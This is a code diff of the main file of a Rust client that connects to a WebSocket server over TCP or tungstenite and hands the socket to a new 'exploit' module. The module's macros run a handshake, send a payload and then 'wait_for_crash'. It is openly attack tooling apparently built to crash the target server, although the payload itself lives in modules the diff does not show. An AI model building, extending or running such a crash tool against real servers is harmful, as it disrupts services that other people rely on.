@@ -5,6 +5,7 @@ use log::{error, info};
 use tungstenite::{connect, stream::MaybeTlsStream};
 
 mod config;
+mod exploit;
 mod frame;
 mod handshake;
 mod payload;
@@ -16,101 +17,40 @@ use clap::Parser;
 use crate::handshake::Handshake;
 use payload::Payload;
 
-fn get_stream() -> Box<TcpStream> {
+fn get_socket_addr() -> String {
     let args = Args::parse();
 
-    let socket_addr = if args.use_tungstenite {
+    if args.use_tungstenite {
         format!("{}://{}:{}", args.protocol, args.address, args.port)
     } else {
         format!("{}:{}", args.address, args.port)
-    };
+    }
+}
+
+fn get_stream_tungstenite() -> MaybeTlsStream<TcpStream> {
+    let socket_addr = get_socket_addr();
 
     info!("Connecting to {}", socket_addr);
 
-    if args.use_tungstenite {
-        let (socket, _) = connect(socket_addr).unwrap_or_else(|f| {
-            error!("Connection failed! Error: {f:?}");
+    let (socket, _) = connect(socket_addr).unwrap_or_else(|f| {
+        error!("Connection failed! Error: {f:?}");
 
-            exit(0)
-        });
+        exit(0)
+    });
 
-        return match socket.into_inner() {
-            MaybeTlsStream::Plain(socket) => Box::new(socket),
-            _ => unreachable!(),
-        };
-    }
+    socket.into_inner()
+}
+
+fn get_stream() -> Box<TcpStream> {
+    let socket_addr = get_socket_addr();
+
+    info!("Connecting to {}", socket_addr);
 
     Box::new(TcpStream::connect(socket_addr).unwrap_or_else(|f| {
         error!("Connection failed! Error: {f:?}");
 
         exit(0)
     }))
-}
-
-fn set_write_timeout(stream: &mut TcpStream) {
-    stream
-        .set_write_timeout(Some(std::time::Duration::from_secs(5)))
-        .unwrap_or_else(|_| {
-            error!("Failed to set write timeout!");
-
-            exit(0)
-        });
-}
-
-fn disable_nagle(stream: &mut TcpStream) {
-    stream.set_nodelay(true).unwrap_or_else(|_| {
-        error!("Failed to set nodelay!");
-
-        exit(0)
-    });
-}
-
-fn perform_handshake(stream: TcpStream) {
-    let args = Args::parse();
-
-    if args.use_tungstenite {
-        return;
-    }
-
-    info!(
-        "Performing WebSocket handshake with headers
-Sec-WebSocket-Key: {}
-Host: {}:{}
-GET {} HTTP/1.1
-",
-        args.sec_websocket_key, args.address, args.port, args.path
-    );
-
-    let mut handshake = Handshake::from(stream.try_clone().unwrap());
-
-    handshake.finish();
-}
-
-fn wait_confirm(stream: &mut TcpStream) {
-    info!("Starting confirmation wait");
-
-    let mut buf = [0u8; 256];
-
-    stream.read(&mut buf).unwrap_or_else(|_| {
-        error!("Failed to read confirmation ! ! ! The server may be down");
-
-        exit(0)
-    });
-
-    info!(
-        "Confirmation completed: {:?}",
-        String::from_utf8_lossy(&buf)
-    );
-}
-
-fn send_payload(stream: &mut TcpStream) {
-    info!("Sending payload");
-
-    let mut payload = Payload::new(stream.try_clone().unwrap());
-
-    payload.send();
-
-    info!("Payload sent");
 }
 
 fn main() {
@@ -120,25 +60,36 @@ fn main() {
 
     env_logger::init();
 
-    let mut stream = get_stream();
+    let args = Args::parse();
 
-    info!("Connected! Passing away the socket (lmao what)");
+    if args.use_tungstenite {
+        let stream = get_stream_tungstenite();
 
-    disable_nagle(&mut stream);
-    set_write_timeout(&mut stream);
-    perform_handshake(stream.try_clone().unwrap());
+        match stream {
+            MaybeTlsStream::NativeTls(mut stream) => {
+                /*
+                 * Options are already set
+                 */
 
-    if !Args::parse().use_tungstenite {
-        wait_confirm(&mut stream);
-    }
+                let mutable = stream.get_mut();
 
-    send_payload(&mut stream);
+                exploit::implementation::execute!(mutable);
+            }
+            MaybeTlsStream::Plain(stream) => {
+                exploit::implementation::execute!(stream);
+            }
+            _ => unreachable!(),
+        }
+    } else {
+        let stream = get_stream();
 
-    loop {
-        wait_confirm(&mut stream);
+        info!("Connected! Passing away the socket (lmao what)");
 
-        info!("Waiting. . .");
-
-        sleep(Duration::from_millis(500));
+        exploit::implementation::disable_nagle!(stream.try_clone().unwrap());
+        exploit::implementation::increase_write_timeout!(stream.try_clone().unwrap());
+        exploit::implementation::perform_handshake!(stream.try_clone().unwrap());
+        exploit::implementation::wait_confirm!(stream.try_clone().unwrap());
+        exploit::implementation::send_payload!(stream.try_clone().unwrap());
+        exploit::implementation::wait_for_crash!(stream);
     }
 }
